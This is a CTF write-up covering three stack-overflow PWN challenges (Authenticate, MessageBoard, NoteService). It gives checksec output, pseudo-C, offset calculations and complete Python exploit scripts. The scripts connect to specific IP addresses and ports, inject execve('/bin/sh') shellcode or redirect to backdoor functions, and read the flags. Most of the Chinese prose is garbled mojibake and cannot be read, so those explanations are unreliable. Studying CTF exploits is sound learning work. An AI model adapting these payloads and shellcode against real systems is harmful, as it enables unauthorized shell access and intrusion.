---
title: "绗崄灞婂尽缃戞澂 PWN 棰樿В鍚堥泦"
date: "2026-05-30"
description: "绗崄灞婂尽缃戞澂 CTF 绔炶禌 PWN 鏂瑰悜涓夐亾棰樼洰鐨勮缁嗛瑙ｏ紝娑电洊鏍堟孩鍑恒€乺et2backdoor銆乻hellcode 娉ㄥ叆绛夌粡鍏稿埄鐢ㄦ墜娉曘€?
tags: ["CTF", "PWN", "寰＄綉鏉?, "Writeup"]
cover: "https://raw.githubusercontent.com/kings-well-byte/images/main/eb35bf8773ba9c7504099778b150e5df.jpg"
---

# 绗崄灞婂尽缃戞澂 PWN 棰樿В鍚堥泦

> **姣旇禌鏃堕棿**锛?026-05-30  
> **鏂瑰悜**锛歅WN (Binary Exploitation)  
> **鎬讳綋闅惧害**锛欵asy  
> **娑夊強鐭ヨ瘑鐐?*锛氭爤婧㈠嚭銆乺et2backdoor銆佹爤鍦板潃娉勯湶銆丼hellcode 娉ㄥ叆銆乺et2text銆佹爤瀵归綈

---

## 鐩綍

- [PWN-Authenticate](#pwn-authenticate--ret2backdoor) 鈥?鏍堟孩鍑?+ ret2backdoor
- [PWN-MessageBoard](#pwn-messageboard--鏍堝湴鍧€娉勯湶--shellcode) 鈥?鏍堝湴鍧€娉勯湶 + Shellcode
- [PWN-NoteService](#pwn-noteservice--ret2text) 鈥?鏍堟孩鍑?+ ret2text

---

# PWN-Authenticate 鈥?ret2backdoor

## 棰樼洰淇℃伅

| 椤圭洰 | 鍐呭 |
|------|------|
| 棰樼洰绫诲瀷 | PWN |
| 闅惧害 | Easy |
| 鑰冪偣 | 鏍堟孩鍑恒€乺et2backdoor銆佹爤瀵归綈 |

## 棰樼洰鍒嗘瀽

杩欐槸涓€閬撶粡鍏哥殑**鏍堟孩鍑哄叆闂ㄩ**銆傜▼搴忓疄鐜颁簡涓€涓畝鍗曠殑鐢ㄦ埛璁よ瘉绯荤粺锛屼絾鍦?`login` 鍑芥暟涓娇鐢ㄤ簡鍗遍櫓鐨?`gets()` 鍑芥暟璇诲彇鐢ㄦ埛杈撳叆鐨勫瘑鐮併€?
`gets()` 鍑芥暟涓嶄細妫€鏌ヨ緭鍏ラ暱搴︼紝鍥犳鍙互鍚戝浐瀹氬ぇ灏忕殑鏍堢紦鍐插尯鍐欏叆浠绘剰闀垮害鐨勬暟鎹紝閫犳垚**鏍堢紦鍐插尯婧㈠嚭**锛圫tack Buffer Overflow锛夈€?
鏇村垢杩愮殑鏄紝绋嬪簭涓嚜甯︿簡涓€涓?`backdoor` 鍑芥暟锛岀洿鎺ヨ皟鐢ㄤ簡 `system("/bin/sh")`銆傝繖鎰忓懗鐫€鎴戜滑涓嶉渶瑕佽嚜宸辨瀯閫犲鏉傜殑 ROP 閾撅紝鍙渶瑕佸皢鍑芥暟鐨勮繑鍥炲湴鍧€瑕嗙洊涓?`backdoor` 鍑芥暟鐨勫湴鍧€鍗冲彲鎷垮埌 shell銆?
### 淇濇姢鏈哄埗妫€鏌?
```bash
$ checksec authenticate
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- **No PIE**锛氱▼搴忓熀鍦板潃鍥哄畾锛屾棤闇€娉勯湶鍗冲彲鐩存帴璺宠浆鍒板悗闂ㄥ嚱鏁?- **No Canary**锛氭病鏈夋爤淇濇姢锛屽彲浠ヤ换鎰忚鐩栬繑鍥炲湴鍧€
- **NX enabled**锛氭爤涓嶅彲鎵ц锛屼絾鏈涓嶉渶瑕佸湪鏍堜笂鎵ц浠ｇ爜

### 鍏抽敭浠ｇ爜鍒嗘瀽

`login` 鍑芥暟浼唬鐮侊細

```c
void login() {
    char password[128];      // rbp-0x80
    printf("Password: ");
    gets(password);          // 鍗遍櫓锛佹棤闀垮害闄愬埗
    if (strcmp(password, "admin") == 0) {
        puts("Access granted.");
    } else {
        puts("Invalid credentials.");
    }
}
```

`backdoor` 鍑芥暟鍦板潃锛歚0x4011f6`

### 婧㈠嚭鍋忕Щ璁＄畻

鍦?64 浣嶇▼搴忎腑锛屾爤甯у竷灞€濡備笅锛?
```
楂樺湴鍧€
+------------------+
|  杩斿洖鍦板潃 (rip)   |  鈫?rbp + 8
+------------------+
|  鏃?rbp 鍊?      |  鈫?rbp
+------------------+
|  password[127]   |  鈫?rbp - 0x80
|      ...         |
|  password[0]     |
+------------------+
浣庡湴鍧€
```

- 缂撳啿鍖哄ぇ灏忥細`0x80` = **128 瀛楄妭**
- 瑕嗙洊 saved rbp 闇€瑕侊細**8 瀛楄妭**
- 鍒拌揪杩斿洖鍦板潃鎬诲亸绉伙細**128 + 8 = 136 瀛楄妭**

### 鏍堝榻愰棶棰?
64 浣嶇▼搴忚皟鐢?`system()` 鏃堕渶瑕佹弧瓒?**16 瀛楄妭鏍堝榻?*锛圧SP 鐨勬渶浣庝綅蹇呴』鏄?0锛夈€傚鏋滅洿鎺ヨ烦杞埌 `backdoor` 鍑芥暟锛岀敱浜?`call` 鎸囦护浼氬帇鍏?8 瀛楄妭鐨勮繑鍥炲湴鍧€锛屽鑷存爤涓嶅榻愶紝鍙兘瑙﹀彂 `movaps` 鎸囦护宕╂簝銆?
瑙ｅ喅鏂规硶锛氬湪 `backdoor` 鍦板潃鍓嶆彃鍏ヤ竴涓?**ret gadget**锛堝 `0x40101a`锛夛紝鍏堟墽琛屼竴娆?`ret` 璋冩暣鏍堟寚閽堬紝鍐嶈烦杞埌鍚庨棬鍑芥暟銆?
## Exploit

```python
import struct, socket, time

HOST = '120.27.146.76'
PORT = 27262

backdoor = 0x4011f6
ret = 0x40101a  # ret gadget锛岀敤浜?16 瀛楄妭鏍堝榻?
# 濉厖 136 瀛楄妭鍒拌揪杩斿洖鍦板潃
payload = b'A' * 136
# 鏍堝榻?+ 璺宠浆鍒板悗闂?payload += struct.pack('<Q', ret)
payload += struct.pack('<Q', backdoor)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect((HOST, PORT))

time.sleep(1)
s.recv(4096)            # "=== Welcome to SecureAuth System ===\nUsername: "
s.send(b'admin\n')
time.sleep(0.5)
s.recv(4096)            # "Password: "
s.send(payload + b'\n')
time.sleep(0.5)
s.recv(4096)            # "Invalid credentials.\n"

# 鎷垮埌 shell锛岃鍙?flag
time.sleep(0.5)
s.send(b'cat /flag*\n')
time.sleep(1)
print(s.recv(4096).decode())
s.close()
```

## Flag

```
flag{eb894509110dfe178dfe94d828d9d15c}
```

---

# PWN-MessageBoard 鈥?鏍堝湴鍧€娉勯湶 + Shellcode

## 棰樼洰淇℃伅

| 椤圭洰 | 鍐呭 |
|------|------|
| 棰樼洰绫诲瀷 | PWN |
| 闅惧害 | Easy |
| 鑰冪偣 | 鏍堝湴鍧€娉勯湶銆丼hellcode 娉ㄥ叆銆佹爤鍙墽琛?|

## 棰樼洰鍒嗘瀽

鏈鏄竴閬?*鏍堝湴鍧€娉勯湶 + Shellcode 娉ㄥ叆**鐨勭粡鍏哥粍鍚堥銆備笌涓婁竴棰樹笉鍚岋紝鏈娌℃湁鐩存帴鐨勫悗闂ㄥ嚱鏁帮紝浣嗙▼搴忓湪杩愯鏃朵細**涓诲姩娉勯湶鏍堜笂 buffer 鐨勫湴鍧€**锛屼笖鏍堢┖闂存槸**鍙墽琛?*鐨勶紙NX 鏈紑鍚級銆?
杩欐剰鍛崇潃鎴戜滑鍙互锛?1. 鎺ユ敹绋嬪簭娉勯湶鐨?buffer 鍦板潃
2. 灏嗙簿蹇冩瀯閫犵殑 Shellcode 鍐欏叆 buffer
3. 鍒╃敤鏍堟孩鍑鸿鐩栬繑鍥炲湴鍧€涓?buffer 鍦板潃
4. 绋嬪簭鎵ц娴佽烦杞埌 buffer 涓婄殑 Shellcode锛岃幏鍙?shell

### 淇濇姢鏈哄埗妫€鏌?
```bash
$ checksec messageboard
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
```

- **NX disabled**锛氭爤鍙墽琛岋紝鍙互鐩存帴鍦ㄦ爤涓婅繍琛?Shellcode锛?- **No PIE**锛歜uffer 鍦板潃铏界劧姣忔杩愯浼氬彉锛屼絾绋嬪簭宸茬粡涓诲姩娉勯湶缁欐垜浠簡

### 鍏抽敭浠ｇ爜鍒嗘瀽

`vuln()` 鍑芥暟閫昏緫锛?
```c
void vuln() {
    char buf[0x80];          // rbp-0x80
    printf("Buffer at: %p\n", buf);  // 娉勯湶鏍堝湴鍧€锛?    printf("Message: ");
    read(0, buf, 0x100);     // 璇诲彇 256 瀛楄妭鍒?128 瀛楄妭缂撳啿鍖猴紝婧㈠嚭锛?}
```

- `printf("Buffer at: %p\n", buf)` 鐩存帴鎵撳嵃浜?buffer 鐨勬爤鍦板潃
- `read(0, buf, 0x100)` 鍏佽璇诲彇 256 瀛楄妭锛屼絾 buffer 鍙湁 128 瀛楄妭锛屾孩鍑?128 瀛楄妭

### 婧㈠嚭鍋忕Щ璁＄畻

- 缂撳啿鍖哄ぇ灏忥細`0x80` = **128 瀛楄妭**
- saved rbp锛?*8 瀛楄妭**
- 鍒拌揪杩斿洖鍦板潃鎬诲亸绉伙細**128 + 8 = 136 瀛楄妭**

### Shellcode 璁捐

鐢变簬鏍堝彲鎵ц锛屾垜浠彲浠ヤ娇鐢ㄧ粡鍏哥殑 x86-64 `execve("/bin/sh")` Shellcode锛?
```asm
; x86-64 execve("/bin/sh", NULL, NULL)
xor    rsi, rsi           ; argv = NULL
push   rsi
movabs rdi, 0x68732f2f6e69622f  ; "/bin//sh"
push   rdi
push   rsp
pop    rdi                ; rdi = &"/bin//sh"
xor    rdx, rdx           ; envp = NULL
push   59
pop    rax                ; syscall number: execve
syscall
```

## Exploit

```python
import socket
import struct
import time

HOST = '120.27.146.76'
PORT = 19743

# x86-64 execve("/bin/sh", NULL, NULL) shellcode
shellcode = (
    b"\x48\x31\xf6"              # xor rsi, rsi
    b"\x56"                      # push rsi
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # movabs rdi, '/bin//sh'
    b"\x57"                      # push rdi
    b"\x54"                      # push rsp
    b"\x5f"                      # pop rdi
    b"\x48\x31\xd2"              # xor rdx, rdx
    b"\x6a\x3b"                  # push 59
    b"\x58"                      # pop rax
    b"\x0f\x05"                  # syscall
)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# 鎺ユ敹骞惰В鏋愭硠闇茬殑 buffer 鍦板潃
data = b""
while b"Buffer at:" not in data:
    data += s.recv(4096)

idx = data.find(b"Buffer at: ")
after = data[idx + len(b"Buffer at: "):]
leak = int(after[:after.find(b"\n")].strip(), 16)
print(f"[+] Buffer address: {hex(leak)}")

while b"Message:" not in data:
    data += s.recv(4096)

# 鏋勯€?payload锛歋hellcode + NOP 濉厖 + 杩斿洖鍦板潃
offset = 0x80 + 8
payload = shellcode + b"\x90" * (offset - len(shellcode)) + struct.pack("<Q", leak)
s.send(payload)

# 鎷垮埌 shell
time.sleep(0.5)
s.send(b"cat /flag*\n")
time.sleep(1)
print(s.recv(4096).decode(errors='replace'))
s.close()
```

## 瑙ｉ瑕佺偣鎬荤粨

1. **淇℃伅娉勯湶鏄叧閿?*锛氱▼搴忎富鍔ㄦ墦鍗颁簡 buffer 鍦板潃锛岀渷鍘讳簡鎴戜滑鎵嬪姩娉勯湶鐨勯夯鐑?2. **NX disabled 鏄墠鎻?*锛氬鏋滄爤涓嶅彲鎵ц锛岃繖绉?Shellcode 娉ㄥ叆鐨勬柟娉曞氨琛屼笉閫氫簡
3. **Shellcode 瑕佺簿绠€**锛氬敖閲忎娇鐢ㄧ煭灏忕殑 Shellcode锛屼负 NOP 婊戞﹪鐣欏嚭绌洪棿

## Flag

```
flag{5e76f1da370f72f3dbac204eade3f3b7}
```

---

# PWN-NoteService 鈥?ret2text

## 棰樼洰淇℃伅

| 椤圭洰 | 鍐呭 |
|------|------|
| 棰樼洰绫诲瀷 | PWN |
| 闅惧害 | Easy |
| 鑰冪偣 | 鏍堟孩鍑恒€乺et2text銆佹爤瀵归綈 |

## 棰樼洰鍒嗘瀽

鏈鏄竴閬撴爣鍑嗙殑 **ret2text** 棰樼洰銆傜▼搴忓瓨鍦ㄤ竴涓槑鏄剧殑鏍堟孩鍑烘紡娲烇紝鍚屾椂鑷甫涓€涓兘澶熻幏鍙?shell 鐨勫嚱鏁?`secret_note`銆傛垜浠殑鐩爣灏辨槸鍒╃敤婧㈠嚭瑕嗙洊杩斿洖鍦板潃锛岃烦杞埌璇ュ嚱鏁版墽琛屻€?
涓庣涓€棰樼被浼硷紝浣嗘湰棰樹娇鐢ㄤ簡 `read()` 鑰岄潪 `gets()`锛屼笖 NX 鏄紑鍚殑锛堟爤涓嶅彲鎵ц锛夛紝鍥犳涓嶈兘浣跨敤 Shellcode 娉ㄥ叆鐨勬柟娉曘€?
### 淇濇姢鏈哄埗妫€鏌?
```bash
$ checksec noteservice
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- **NX enabled**锛氭爤涓嶅彲鎵ц锛屾棤娉曚娇鐢?Shellcode
- **No PIE**锛氬嚱鏁板湴鍧€鍥哄畾锛屽彲鐩存帴璺宠浆

### 鍏抽敭浠ｇ爜鍒嗘瀽

`vuln` 鍑芥暟锛?x4011ad锛夛細

```c
void vuln() {
    char buf[64];            // rsp+0x0, 瀹為檯绌洪棿 0x40
    printf("Note: ");
    read(0, buf, 0x100);     // 璇诲彇 256 瀛楄妭鍒?64 瀛楄妭缂撳啿鍖猴紒
}
```

`secret_note` 鍑芥暟锛?x401196锛夛細

```c
void secret_note() {
    system("/bin/sh");
}
```

### 婧㈠嚭鍋忕Щ璁＄畻

- 缂撳啿鍖哄ぇ灏忥細`0x40` = **64 瀛楄妭**
- saved rbp锛?*8 瀛楄妭**
- 鍒拌揪杩斿洖鍦板潃鎬诲亸绉伙細**64 + 8 = 72 瀛楄妭**

### 鏍堝榻愬鐞?
涓庣涓€棰樼浉鍚岋紝64 浣嶄笅璋冪敤 `system()` 闇€瑕?16 瀛楄妭鏍堝榻愩€傚湪 `secret_note` 鍦板潃鍓嶆彃鍏ヤ竴涓?`ret` gadget锛坄0x4010e4`锛夊嵆鍙В鍐炽€?
## Exploit

```python
import socket
import struct
import time

def p64(x):
    return struct.pack('<Q', x)

host = '47.99.147.34'
port = 10858

secret_note = 0x401196
ret_gadget = 0x4010e4

# 72 bytes 濉厖鍒拌揪杩斿洖鍦板潃
payload = b'A' * (0x40 + 8)
# ret gadget 鏍堝榻?+ 璺宠浆鍒板悗闂ㄥ嚱鏁?payload += p64(ret_gadget)
payload += p64(secret_note)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

time.sleep(0.5)
s.recv(4096)

s.send(payload + b'\n')
time.sleep(0.5)
s.recv(4096)

# 璇诲彇 flag
s.send(b'cat /flag\n')
time.sleep(0.5)
print(s.recv(4096).decode())

s.close()
```

## 涓夐瀵规瘮鎬荤粨

| 棰樼洰 | 婧㈠嚭鍑芥暟 | 鍒╃敤鏂瑰紡 | 鐗规畩鏉′欢 |
|------|----------|----------|----------|
| **Authenticate** | `gets()` | ret2backdoor | 闇€鏍堝榻?|
| **MessageBoard** | `read()` | Shellcode 娉ㄥ叆 | 鏍堝彲鎵ц + 鍦板潃娉勯湶 |
| **NoteService** | `read()` | ret2text | 闇€鏍堝榻?|

## Flag

```
flag{db35a83bde913ee94d6a7200849bb08a}
```

---

> **鍚庤**锛氳繖涓夐亾棰橀兘鏄?PWN 鏂瑰悜鐨勫叆闂ㄧ粡鍏搁鍨嬶紝娑电洊浜嗘爤婧㈠嚭鏈€鍩虹鐨勫埄鐢ㄦ柟寮忋€傜啛缁冩帉鎻¤繖浜涘熀纭€鍚庯紝鍙互杩涗竴姝ュ涔?ROP 閾炬瀯閫犮€佹牸寮忓寲瀛楃涓层€佸爢鍒╃敤绛夎繘闃舵妧鏈€?
